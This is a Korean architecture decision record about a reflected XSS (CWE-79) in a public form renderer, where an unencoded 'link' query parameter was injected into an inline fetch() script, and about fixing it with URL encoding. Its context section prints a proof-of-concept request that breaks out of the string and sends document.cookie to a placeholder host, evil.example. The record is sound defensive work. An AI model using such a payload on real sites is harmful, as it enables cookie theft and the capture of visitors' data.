# ADR-0015: 공개 폼 렌더링에 삽입되는 방문자 입력값은 URL 인코딩한다

## 상태
Accepted

## 맥락
`GET /f/{slug}`는 `link` 쿼리파라미터(배포 링크 토큰)를 받아, 폼 제출용 인라인 `<script>`에
`fetch('{submitUrl}', ...)` 형태로 삽입한다(`docs/adr/0007`). `link`는 방문자 요청의
쿼리파라미터 값을 그대로 받는데, `POST /f/{slug}/submissions`와 달리 `GET /f/{slug}`는
이 값이 실제 존재하는 배포 링크인지 검증하지 않는다.

수정 전 코드는 이 값을 이스케이프 없이 문자열 이어붙이기로 `submitUrl`을 만들고, 그 값을
JS 문자열 리터럴에 그대로 넣었다. 다음과 같은 요청으로 실제 재현했다:

```
GET /f/some-slug?link=');new Image().src='https://evil.example/steal?c='+document.cookie;//
```

`link` 값의 홑따옴표가 `fetch('...')`의 문자열 리터럴을 끊고, 뒤에 이어지는 임의 JS가
그대로 실행된다. CSP는 `connect-src 'self'; frame-ancestors 'none'`만 설정되어 있어
(`docs/adr/0011`의 잔여 위험 대응), 인라인 스크립트 실행 자체는 막지 못하고
`<img>` 기반 데이터 유출(`img-src` 미설정)도 막지 못한다. 방문자가 폼에 입력하는 개인정보를
탈취하거나 페이지를 피싱 화면으로 바꿔치기할 수 있는 반사형 XSS(CWE-79)였다.

## 결정
`FormRenderService.render()`에서 `linkToken`을 `submitUrl`에 삽입하기 전
`URLEncoder.encode(linkToken, StandardCharsets.UTF_8)`로 인코딩한다. `'`, `<`, `>`, `"`
등은 모두 퍼센트 인코딩되어 JS 문자열 리터럴이나 HTML 밖으로 탈출할 수 없다.

## 근거
- "등록된 HTML은 신뢰하지 않는다"는 이 프로젝트의 핵심 경계(ADR-0011)와는 별개로, "우리가
  직접 만들어 삽입하는 스크립트에 방문자 입력값을 넣을 때도 그 값을 대상 컨텍스트(여기선 JS
  문자열 리터럴)에 맞게 인코딩해야 한다"는 별도 규칙을 놓쳤다. 신뢰 경계를 지키는 것과
  출력 인코딩(output encoding)은 서로 다른 방어이고, 둘 다 필요하다.
- `link`가 실제 존재하는 배포 링크인지 GET 단계에서 검증하는 방법(화이트리스트 검증)도
  대안이었지만, URL 인코딩이 더 근본적인 수정이다 — 검증을 우회하는 새로운 경로가 생기더라도
  인코딩은 그 컨텍스트에 들어가는 모든 값에 항상 적용되는 방어이기 때문이다.

## 결과
- 장점: 최소 변경으로 취약점을 근본 원인(컨텍스트에 맞지 않는 미인코딩 삽입)에서 차단한다.
- 단점: CSP에 `script-src`가 없다는 잔여 위험은 남아 있다 — 우리가 직접 삽입하는 스크립트가
  인라인이라 `script-src 'self'`만으로는 그 스크립트마저 막히므로, nonce/hash 기반
  CSP로 가려면 별도 리팩터링이 필요하다. 이번 수정 범위에서는 반사형 XSS의 구체적인 진입점만
  막았고, 이 잔여 위험은 향후 과제로 남긴다.
